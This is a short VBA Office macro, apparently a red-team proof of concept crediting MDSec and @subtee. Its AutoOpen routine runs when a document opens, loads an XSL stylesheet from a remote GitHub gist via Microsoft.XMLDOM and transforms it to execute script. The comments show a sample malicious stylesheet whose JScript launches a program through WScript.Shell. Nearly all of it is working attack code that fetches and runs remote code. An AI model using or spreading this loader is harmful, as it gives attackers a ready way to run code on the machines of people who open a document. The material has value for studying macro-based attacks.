Sub AutoOpen()

' https://www.mdsec.co.uk/2018/06/freestyling-with-sharpshooter-v1-0/
Set XML = CreateObject("Microsoft.XMLDOM")
XML.async = False
Set xsl = XML
xsl.Load ("https://gist.githubusercontent.com/S3cur3Th1sSh1t/2985fec24e4b5cb3597bb256fbdf4fa6/raw/b31019ab6bfe14befa37f943a4df988ecf0db248/calc.xsl")
XML.transformNode xsl

' The evil xsl can look somehow like this, credit to @subtee:
' <?xml version='1.0'?>
' <stylesheet
' xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
' xmlns: user = "placeholder"
' version="1.0">
' <output method="text"/>
'     <ms:script implements-prefix="user" language="JScript">
'     <![CDATA[
'     var r = new ActiveXObject("WScript.Shell").Run("calc");
'     ]]> </ms:script>
' </stylesheet>
End Sub

